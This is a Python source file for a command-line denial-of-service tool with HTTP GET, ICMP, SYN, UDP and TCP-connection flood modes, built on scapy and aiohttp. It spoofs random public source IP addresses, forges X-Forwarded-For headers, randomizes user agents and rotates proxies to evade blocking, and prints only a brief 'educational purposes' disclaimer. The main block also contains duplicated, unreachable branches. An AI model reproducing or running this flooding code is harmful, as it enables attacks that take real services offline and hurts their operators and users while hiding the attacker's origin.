import asyncio
import aiohttp
import time
import requests
import random
import ipaddress
import sys
import argparse
import socket
from scapy.all import *
import platform
import subprocess
import ctypes

max_packet_size = 1400
status_helper = []

def disclaimer():
    green = "\033[32m"
    reset = "\033[0m"

    print(green + r"""
    ==============================================================
    disclaimer

    this software is intended for educational purposes and
    should only be used on systems you own or have explicit
    permission to test.

    the author is not responsible for any misuse, damage, or legal
    consequences resulting from unauthorized use.
    ==============================================================
    """ + reset)


def packet_validation(args):
    if args.weight > max_packet_size:
        size_answer = input("WARNING packet can get fragmented still continue? (y/n)")
        if size_answer.lower() in ["n", "no"]:
            print("exiting...")
            sys.exit()
        elif size_answer.lower() in ["y", "yes"]:
            pass
    
    else:
        pass        

def administrator_check():
    system = platform.system()
    if system in ["Linux", "SunOS", "Darwin"]: 
        try:
            result = subprocess.run(["id", "-u"], capture_output=True, text=True)
            return result.stdout.strip() == "0"
        except:
            return False
    elif system == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except:
            return False
    else:
        print("please run as a root")
        return False

def randomip():
    while True:
        first = random.randint(1, 223)
        second = random.randint(1, 254)
        third = random.randint(1, 254)
        fourth = random.randint(1, 254)
        ip = f"{first}.{second}.{third}.{fourth}"
        if first == 10:
            continue 
        if first == 172 and 16 <= second <= 31:
            continue  
        if first == 192 and second == 168:
            continue 
        if first == 169 and second == 254:
            continue 
        if first == 127:
            continue 
        return ip

def ip_validation_src(args):
    try:
        ipaddress.IPv4Address(args.src) 
    except ipaddress.AddressValueError:
        print("invalid ip address. please try again.")
        sys.exit()

def ip_validation_target(args):
    try:
        ipaddress.IPv4Address(args.target_ip) 
    except ipaddress.AddressValueError:
        print("invalid ip address. please try again.")
        sys.exit()

def proxy_helper(args):
    proxies = args.proxies
    proxy = random.choice(proxies) if proxies else None
    if proxy and not proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
        print(f"WARNING proxy format may be invalid: {proxy}")

    x_forwarded_for = randomip() if not proxy else None
    return proxy, x_forwarded_for

def source_helper(args):
    if args.src == "random":
        source_ip = randomip()
    else:
        source_ip = args.src
    return source_ip    


async def statuscode(session, args):
    proxy, x_forwarded_for = proxy_helper(args)
    async with session.get(args.url,
                    headers={
                        "User-Agent": user_agent(),
                        "X-Forwarded-For": x_forwarded_for
                        },
                        proxy=proxy,) as response:
        status = response.status
        if not status_helper:  
            if 200 <= status < 300:
                print(f"url is valid (status {status}: success)")

            elif 300 <= status < 400:
                print(f"url returned a redirection (status {status}).")

            elif 400 <= status < 500:
                print(f"client error detected (status {status}: check the url)")

            elif 500 <= status < 600:
                print(f"server error detected (status {status})")

            else:
                print(f"unexpected status code {status}")
            status_helper.append(1)
        else:
            print(f"status code {status}")


def Keyboard_interrupt_helper():
    print("stopped by user:")
    sys.exit()
    
def exception_helper():
    print("error has occurred")
    sys.exit()

def user_agent():
    browsers = ["firefox", "chrome"]
    os = ["debian", "windows",]
    major_chrome = random.randint(125, 137)
    minor_chrome = random.randint(0, 9)
    build_chrome = random.randint(1000, 9999)
    patch_chrome = random.randint(0, 99)
    major_firefox=random.randint(120,134)
    minor_firefox=0
    os_choice = random.choice(os)
    browser = random.choice(browsers)
    all_chrome = f"{major_chrome}.{minor_chrome}.{build_chrome}.{patch_chrome}"
    all_firefox = f"{major_firefox}.{minor_firefox}"

    if os_choice == "debian" and browser == "chrome":
       return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{all_chrome} Safari/537.36"
    
    elif os_choice == "debian" and browser == "firefox":
        return f"Mozilla/5.0 (X11; Linux x86_64; rv:{all_firefox}) Gecko/20100101 Firefox/{all_firefox}"
    
    elif os_choice == "windows" and browser == "firefox":
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{all_firefox}) Gecko/20100101 Firefox/{all_firefox}"
    
    elif os_choice  == "windows" and browser == "chrome":
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{all_chrome} Safari/537.36"
    

async def http_get_flood(args):
    disclaimer()
    try:
        timeout_info = aiohttp.ClientTimeout(total=args.timeout)
        async with aiohttp.ClientSession(timeout=timeout_info) as session:
            await statuscode(session, args)
            start_time = time.time()
            useragent= user_agent()
            while True:
                if time.time() - start_time >= args.duration:
                    break
                tasks = []    
                proxy, x_forwarded_for = proxy_helper(args)
                for i in range(args.quantity):
                    tasks.append(session.get(
                        args.url,
                        headers={
                            "User-Agent": useragent,
                            "X-Forwarded-For": x_forwarded_for
                        },
                        proxy=proxy,
                                     )
                    )   
                await asyncio.gather(*tasks)
                await asyncio.sleep(args.delay)
                await statuscode(session, args)
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper()     
                    
                    
async def icmpflood(args):
    disclaimer()
    packet_validation(args)
    if not administrator_check():
        print("need root privileges for icmp flood")
        sys.exit()
    try:
        start_time = time.time()
        while True:

            if time.time() - start_time >= args.duration:
                break
            source_ip = source_helper(args)    
            base_packet = IP(src=source_ip,
                             dst=args.target_ip,
                             ttl=args.ttl
                             )/ICMP()
            header_size = len(bytes(base_packet))
            payload_size = max(0, args.weight - header_size)
            payload = b"A" * payload_size
            packet = base_packet / Raw(payload)
            tasks = [asyncio.to_thread(send, packet, verbose=False) for i in range(args.quantity)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(args.delay)
            print(f"sent {args.quantity} packets to {args.target_ip}")
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper() 


async def tcp_flood(args):
    disclaimer()
    try:
        start_time = time.time()
        while True:
            if time.time() - start_time >= args.duration:
                break
            tasks = []
            for _ in range(args.quantity):
                tasks.append(asyncio.to_thread(make_tcp_connection, args))
            await asyncio.gather(*tasks)
            print(f"made {args.quantity} tcp connections with {args.target_ip}")
            await asyncio.sleep(args.delay)
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper()

def make_tcp_connection(args):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(args.timeout)
        s.connect((args.target_ip, args.port))
        s.close()
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper()


async def udp_flood(args):
    disclaimer()
    packet_validation(args)
    if not administrator_check():
        print("Need root privileges for udp flood")
        sys.exit()
    try:
        start_time = time.time()
        while True:
            if time.time() - start_time >= args.duration:
                break
            source_ip = source_helper(args)    
            udp_ip_pkt = IP(src=source_ip,
                            dst=args.target_ip,
                            ttl=args.ttl
                            )
            udp_pkt = UDP(dport = args.port, sport = 12345)
            udp_header  = len(bytes(udp_ip_pkt/udp_pkt))
            udp_payload = max(0, args.weight - udp_header)
            Aweight = b"A" * udp_payload
            packet = udp_ip_pkt/udp_pkt/Raw(Aweight)          
            tasks = [asyncio.to_thread(send, packet, verbose=False) for i in range(args.quantity)]
            await asyncio.gather(*tasks)
            print("sent", args.quantity, "packets to ", args.target_ip)
            await asyncio.sleep(args.delay) 
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper()


async def synflood(args):
    disclaimer()
    packet_validation(args)
    if not administrator_check():
        print("need root privileges for syn flood")
        sys.exit()
    try:
        start_time = time.time()
        while True:
            if time.time() - start_time >= args.duration:
                break
            source_ip = source_helper(args)    
            ip_pkt = IP(
                src=source_ip,
                dst=args.target_ip,
                ttl=args.ttl
            )
            tcp = TCP(dport=args.port, sport=12345, flags="S")
            header = len(bytes(ip_pkt/tcp))
            payload = max(0, args.weight - header)
            payload_weight = b"A" * payload 
            packet = ip_pkt / tcp / Raw(payload_weight)
            tasks = [asyncio.to_thread(send, packet, verbose=False) for i in range(args.quantity)]
            await asyncio.gather(*tasks)
            print(f"sent {args.quantity} packets to {args.target_ip}")
            await asyncio.sleep(args.delay)
    except KeyboardInterrupt:
        Keyboard_interrupt_helper()
    except Exception:
        exception_helper()       

parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers(dest="command", required=True)
http_parser = subparsers.add_parser("httpflood", help="http mode")
http_parser.add_argument("--url", type=str, required=True, help ="target url")
http_parser.add_argument("--quantity", type=int, default=100, help="number of requests per bunch")
http_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
http_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
http_parser.add_argument("--proxies", type=str, nargs="+", default=None, help="List of proxy URLs")
http_parser.add_argument("--timeout", type=int, default=64, help="http request timeout")

icmp_parser = subparsers.add_parser("icmpflood", help="icmp mode")
icmp_parser.add_argument("--quantity", type=int, default=100, help="number of requests per bunch")
icmp_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
icmp_parser.add_argument("--src", type=str, default="random", help="source ip (random by default)")
icmp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
icmp_parser.add_argument("--weight", type=int, default=64, help="packet size")
icmp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
icmp_parser.add_argument("--ttl", type=int, default=64, help="time to live for packets")

syn_parser = subparsers.add_parser("synflood", help="syn mode")
syn_parser.add_argument("--weight", type=int, default=64, help="packet size")
syn_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
syn_parser.add_argument("--quantity", type=int, default=100, help="number of requests per bunch")
syn_parser.add_argument("--delay", type=int, default=1 , help="delay after each bunch")
syn_parser.add_argument("--src", type=str, default="random" , help="source ip (random by default)")
syn_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)") 
syn_parser.add_argument("--port", type=int, default=443, help="destination port" )
syn_parser.add_argument("--ttl", type=int, default=64, help="time to live for packets")

udp_parser = subparsers.add_parser("udpflood", help="udp mode")
udp_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
udp_parser.add_argument("--quantity", type=int, default=100,help="number of requests per bunch")
udp_parser.add_argument("--weight", type=int, default=64, help="packet size")
udp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
udp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
udp_parser.add_argument("--src", type=str, default="random", help="source ip (random by default)")
udp_parser.add_argument("--port", type=int, default=443, help="destination port")
udp_parser.add_argument("--ttl", type=int, default=64, help="time to live for packets")

tcp_parser = subparsers.add_parser("tcpflood", help="tcp connection mode")
tcp_parser.add_argument("--target_ip", type=str, required=True, help="target ip")
tcp_parser.add_argument("--port", type=int, default=443, help="target port")
tcp_parser.add_argument("--quantity", type=int, default=100, help="number of connections")
tcp_parser.add_argument("--delay", type=int, default=1, help="delay after each bunch")
tcp_parser.add_argument("--duration", type=int, default=60, help="duration of the attack(in seconds)")
tcp_parser.add_argument("--timeout", type=int, default=2, help="tcp connection timeout")

if __name__ == "__main__":
    args = parser.parse_args()
    if args.command == "httpflood":
        asyncio.run(http_get_flood(args))
    elif args.command == "icmpflood":
        if args.src != "random":
            ip_validation_src(args)
        asyncio.run(icmpflood(args))
    elif args.command == "synflood":
        if args.src != "random":
            ip_validation_src(args)
        asyncio.run(synflood(args)) 
    elif args.command == "udpflood":
        if args.src != "random":
            ip_validation_src(args)
        asyncio.run(udp_flood(args))
    elif args.command == "tcpflood":
        ip_validation_target(args)
        asyncio.run(tcp_flood(args))
        asyncio.run(synflood(args)) 
    elif args.command == "udpflood":
        ip_validation_src(args)
        asyncio.run(udp_flood(args))
    elif args.command == "tcpflood":
        ip_validation_target(args)
        asyncio.run(tcp_flood(args))

